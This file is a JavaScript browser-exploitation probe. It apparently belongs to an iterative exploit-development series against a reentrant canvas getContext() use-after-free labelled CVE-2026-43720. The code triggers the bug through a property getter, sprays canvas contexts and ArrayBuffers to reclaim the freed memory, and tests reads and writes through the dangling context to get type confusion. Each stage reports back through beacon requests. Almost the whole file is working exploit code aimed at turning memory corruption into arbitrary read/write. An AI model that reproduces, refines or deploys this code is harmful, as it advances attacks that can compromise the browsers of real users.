// p463-canvas-uaf-escalation.js — Canvas getContext UAF escalation
//
// V461 confirmed: same-type aliasing (innerCtx ↔ sprayCtxs[10]), bidirectional R/W
// V461 confirmed: AB spray crashes (B-SPRAYED was last beacon before crash)
//
// This probe tests:
// A: Reproduce aliasing + identify exact spray index
// B: Free aliased context via DOM removal + GC → is innerCtx truly dangling?
// C: If dangling, spray ABs to reclaim → read/write through canvas API = type confusion
// D: Determine CanvasRenderingContext2D size class via AB response
//
// CVE-2026-43720: reentrant getContext() UAF
(function() {
  var RUN = 'p463-' + Date.now().toString(36);
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag + '/' + RUN, false);
      x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
    } catch(e) {}
  }
  B('BOOT', navigator.userAgent);

  // === HELPER: trigger canvas UAF, return { innerCtx, outerCtx, canvas } ===
  function triggerUAF() {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);
    var inner = null, outer = null, tc = 0;
    var s = {};
    Object.defineProperty(s, 'desynchronized', {
      get: function() { tc++; if (tc === 1) inner = c.getContext('2d'); return false; }
    });
    outer = c.getContext('2d', s);
    if (!inner || inner === outer) return null;
    return { innerCtx: inner, outerCtx: outer, canvas: c };
  }

  // === TEST A: Reproduce aliasing, determine spray index ===
  try {
    var uaf = triggerUAF();
    if (!uaf) { B('A-SKIP', 'no UAF'); }
    else {
      var sprayCanvases = [];
      var sprayCtxs = [];
      for (var i = 0; i < 200; i++) {
        var c = document.createElement('canvas');
        c.width = 1; c.height = 1;
        sprayCanvases.push(c);
        sprayCtxs.push(c.getContext('2d'));
        sprayCtxs[i].lineWidth = 500 + i;
      }
      var readLW = -1;
      try { readLW = uaf.innerCtx.lineWidth; } catch(e) { readLW = 'ERR:' + e.message.slice(0,80); }
      var aliasedIdx = (typeof readLW === 'number' && readLW >= 500) ? Math.round(readLW - 500) : -1;

      // Verify bidirectional
      var verified = false, reverseVerified = false;
      if (aliasedIdx >= 0 && aliasedIdx < 200) {
        uaf.innerCtx.lineWidth = 12345.5;
        verified = (sprayCtxs[aliasedIdx].lineWidth === 12345.5);
        sprayCtxs[aliasedIdx].lineWidth = 67890.25;
        reverseVerified = (uaf.innerCtx.lineWidth === 67890.25);
      }

      B('A-RESULT', {
        readLW: readLW,
        aliasedIdx: aliasedIdx,
        verified: verified,
        reverseVerified: reverseVerified
      });

      // === TEST B: Free aliased context ===
      // Keep innerCtx alive, destroy everything about the aliased spray canvas
      if (aliasedIdx >= 0 && aliasedIdx < 200) {
        var deadCanvas = sprayCanvases[aliasedIdx];
        var deadCtx = sprayCtxs[aliasedIdx];

        // Mark with known value before free
        deadCtx.lineWidth = 31337.0;
        var preFree = uaf.innerCtx.lineWidth;

        // Remove from DOM
        if (deadCanvas.parentNode) deadCanvas.parentNode.removeChild(deadCanvas);

        // Null JS references
        sprayCanvases[aliasedIdx] = null;
        sprayCtxs[aliasedIdx] = null;
        deadCtx = null;
        deadCanvas = null;

        // Force GC
        for (var gc = 0; gc < 5; gc++) {
          var waste = [];
          for (var w = 0; w < 10000; w++) waste.push({ a: new ArrayBuffer(64) });
          waste = null;
        }

        // Check: does innerCtx still read 31337?
        var postFree = -1;
        try { postFree = uaf.innerCtx.lineWidth; } catch(e) { postFree = 'ERR:' + e.message.slice(0,80); }

        // Read several properties to check if any crash
        var postProps = {};
        try { postProps.globalAlpha = uaf.innerCtx.globalAlpha; } catch(e) { postProps.globalAlpha = 'ERR'; }
        try { postProps.shadowBlur = uaf.innerCtx.shadowBlur; } catch(e) { postProps.shadowBlur = 'ERR'; }
        try { postProps.miterLimit = uaf.innerCtx.miterLimit; } catch(e) { postProps.miterLimit = 'ERR'; }

        B('B-FREED', {
          preFree: preFree,
          postFree: postFree,
          postProps: postProps,
          stillAlias: (postFree === 31337.0)
        });

        // === TEST C: If freed, spray ABs to reclaim ===
        // Only run if post-free shows different value (suggesting actual free)
        if (postFree !== 31337.0 || typeof postFree !== 'number') {
          B('C-SKIP', { reason: 'context not freed or crashed', postFree: postFree });
        } else {
          // Context still alive (RefPtr keeps it). Try more aggressive free.
          // Set innerCtx reference to WeakRef... but WeakRef only works with objects.
          // We can't force-free the context while holding innerCtx.
          B('C-REFPTR', { note: 'innerCtx RefPtr keeps C++ context alive' });
        }

        // === TEST C-ALT: Different approach — use SECOND UAF with AB spray ===
        // Create a fresh UAF where the freed context has NO JS wrapper survivor
        // by NOT saving innerCtx, then spray ABs
        try {
          var c2 = document.createElement('canvas');
          c2.width = 1; c2.height = 1;
          document.body.appendChild(c2);
          var inner2 = null, outer2 = null, tc2 = 0;
          var s2 = {};

          // Store results from inner call in a closure variable
          var innerReported = false;
          Object.defineProperty(s2, 'desynchronized', {
            get: function() {
              tc2++;
              if (tc2 === 1) {
                inner2 = c2.getContext('2d');
                // inner2 just got created. outer call will replace it.
                // When outer call creates #2 in createContext2d, #1 is freed.
                // We need to spray DURING the outer createContext2d,
                // AFTER #1 is freed but BEFORE outer returns.
                // That's impossible from this getter (it runs before createContext2d).

                // Alternative: don't save inner2. Let both be wrapper-less.
                // Then GC can free context #1.
              }
              return false;
            }
          });
          outer2 = c2.getContext('2d', s2);

          // Now: outer2 = context #2 (live on canvas).
          // inner2 = context #1 wrapper. #1 was freed by unique_ptr.
          // BUT inner2's RefPtr keeps #1 alive.

          // Test: does inner2 still work?
          var inner2works = false;
          try {
            inner2.lineWidth = 88888;
            inner2works = (inner2.lineWidth === 88888);
          } catch(e) {}

          B('C-ALT-INNER', { inner2works: inner2works });

          // Now null inner2 and force GC → #1 should be freed
          inner2 = null;
          for (var gc = 0; gc < 5; gc++) {
            var waste = [];
            for (var w = 0; w < 10000; w++) waste.push(new ArrayBuffer(64));
            waste = null;
          }

          B('C-ALT-GC', 'gc-done');

          // #1's slot should be free now. Spray ABs.
          var absC = [];
          var sizes = [128, 192, 256, 320, 384, 448, 512, 640, 768, 1024];
          for (var si = 0; si < sizes.length; si++) {
            for (var i = 0; i < 100; i++) {
              var ab = new ArrayBuffer(sizes[si]);
              var view = new Float64Array(ab);
              // Fill with recognizable pattern: size-index marker
              for (var j = 0; j < view.length; j++) {
                view[j] = 1000000 + si * 1000 + j;
              }
              absC.push({ ab: ab, view: view, size: sizes[si] });
            }
          }

          B('C-ALT-SPRAYED', { count: absC.length, sizes: sizes });
          // Note: we CANNOT read through inner2 — it was nulled.
          // This test just confirms AB spray works without crash.

        } catch(e) {
          B('C-ALT-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
        }
      }

      // === TEST D: Same-type spray then selective free ===
      // V461 approach: alias first, then selectively free just the aliased canvas
      // Try reading through innerCtx AFTER AB spray of different sizes
      try {
        var uaf2 = triggerUAF();
        if (!uaf2) { B('D-SKIP', 'no UAF'); }
        else {
          var sp2 = [];
          var sc2 = [];
          for (var i = 0; i < 200; i++) {
            var c = document.createElement('canvas');
            c.width = 1; c.height = 1;
            sp2.push(c);
            sc2.push(c.getContext('2d'));
            sc2[i].lineWidth = 800 + i;
          }
          var lw2 = -1;
          try { lw2 = uaf2.innerCtx.lineWidth; } catch(e) { lw2 = 'ERR'; }
          var idx2 = (typeof lw2 === 'number' && lw2 >= 800) ? Math.round(lw2 - 800) : -1;

          B('D-ALIAS', { lw: lw2, idx: idx2 });

          if (idx2 >= 0 && idx2 < 200) {
            // Phase 1: Remove aliased canvas + null + GC
            if (sp2[idx2].parentNode) sp2[idx2].parentNode.removeChild(sp2[idx2]);
            sc2[idx2] = null;
            sp2[idx2] = null;

            // Also remove ALL other spray canvases to free 192-byte slots
            for (var i = 0; i < 200; i++) {
              if (i !== idx2) {
                if (sp2[i] && sp2[i].parentNode) sp2[i].parentNode.removeChild(sp2[i]);
                sc2[i] = null;
                sp2[i] = null;
              }
            }

            // GC hard
            for (var gc = 0; gc < 10; gc++) {
              var waste = [];
              for (var w = 0; w < 5000; w++) waste.push(new ArrayBuffer(64));
              waste = null;
            }

            // Check: innerCtx still alive?
            var postVal = -1;
            try { postVal = uaf2.innerCtx.lineWidth; } catch(e) { postVal = 'ERR:' + e.message.slice(0, 100); }

            B('D-POST-GC', { postVal: postVal });

            // Phase 2: Spray ABs at candidate sizes
            // Use float64 pattern: NaN-boxed values that look like valid pointers
            // Fill with a pattern that won't crash when read as State stack pointer
            var dAbs = [];
            for (var i = 0; i < 500; i++) {
              var ab = new ArrayBuffer(256); // common size class
              var f64 = new Float64Array(ab);
              for (var j = 0; j < f64.length; j++) {
                f64[j] = 999.125 + j * 0.0625; // recognizable float pattern
              }
              dAbs.push({ ab: ab, f64: f64 });
            }
            for (var i = 0; i < 500; i++) {
              var ab = new ArrayBuffer(384);
              var f64 = new Float64Array(ab);
              for (var j = 0; j < f64.length; j++) {
                f64[j] = 888.125 + j * 0.0625;
              }
              dAbs.push({ ab: ab, f64: f64 });
            }

            B('D-AB-SPRAYED', { count: dAbs.length });

            // Try safe reads first — getContextAttributes reads m_settings directly
            // (bool + enum, no pointer dereference through state stack)
            var dRead = {};
            try {
              var attrs = uaf2.innerCtx.getContextAttributes();
              dRead.attrs = { desync: attrs.desynchronized, colorSpace: attrs.colorSpace };
            } catch(e) { dRead.attrs = 'ERR:' + e.message.slice(0,100); }

            // Try save() — just increments m_unrealizedSaveCount, no deref
            try { uaf2.innerCtx.save(); dRead.saveOk = true; } catch(e) { dRead.saveOk = false; }

            // Try reading canvas property — dereferences m_canvas pointer
            try { dRead.canvasTag = uaf2.innerCtx.canvas.tagName; } catch(e) { dRead.canvasTag = 'ERR:' + e.message.slice(0,100); }

            // Try lineWidth — dereferences state stack (likely crashes)
            try { dRead.lineWidth = uaf2.innerCtx.lineWidth; } catch(e) { dRead.lineWidth = 'ERR:' + e.message.slice(0,100); }
            try { dRead.globalAlpha = uaf2.innerCtx.globalAlpha; } catch(e) { dRead.globalAlpha = 'ERR'; }

            // Convert lineWidth to hex for analysis
            if (typeof dRead.lineWidth === 'number') {
              try {
                var buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = dRead.lineWidth;
                var u8 = new Uint8Array(buf);
                var hex = '';
                for (var i = 0; i < 8; i++) hex += ('0' + u8[i].toString(16)).slice(-2);
                dRead.lineWidthHex = hex;
              } catch(e) {}
            }

            B('D-RESULT', dRead);

            // Try WRITING through innerCtx
            try {
              uaf2.innerCtx.lineWidth = 77777.5;
              dRead.writeOk = true;
            } catch(e) {
              dRead.writeOk = false;
              dRead.writeErr = e.message.slice(0, 80);
            }

            // Check if any AB was modified
            var modified = [];
            for (var i = 0; i < dAbs.length; i++) {
              for (var j = 0; j < dAbs[i].f64.length; j++) {
                if (dAbs[i].f64[j] === 77777.5) {
                  modified.push({ abIdx: i, offset: j, size: dAbs[i].ab.byteLength });
                  break;
                }
              }
              if (modified.length > 0) break;
            }

            B('D-WRITE', { writeOk: dRead.writeOk, modified: modified });
          }
        }
      } catch(e) {
        B('D-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
      }
    }
  } catch(e) {
    B('A-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
  }

  B('ALIVE', 'all-tests-completed');
  B('DONE', RUN);
})();
